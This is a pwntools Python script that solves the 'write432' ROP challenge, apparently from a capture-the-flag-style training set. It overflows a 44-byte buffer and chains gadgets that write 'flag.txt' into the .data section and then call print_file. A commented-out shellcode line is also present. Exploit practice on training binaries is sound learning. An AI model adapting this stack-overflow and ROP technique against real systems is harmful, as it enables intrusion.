#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./write432
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./write432")
context.terminal = ["alacritty", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+177
break print_file
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

write_edi_ebp = 0x08048543
pop_edi_ebp = 0x080485AA
file_string = 0x80485D0
print_file = 0x080483D0
data_section = 0x0804A018
offset = 44

io = start()

payload = flat(
    b"A" * offset,
    pop_edi_ebp,
    data_section,
    "./fl",
    write_edi_ebp,
    pop_edi_ebp,
    data_section + 0x4,
    "ag.t",
    write_edi_ebp,
    pop_edi_ebp,
    data_section + 0x8,
    "xt\0\0",
    write_edi_ebp,
    print_file,
    0x0,
    data_section,
)
# payload = flat(asm("nop") * offset, print_file, 0x0, "flag.txt")

io.sendline(payload)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
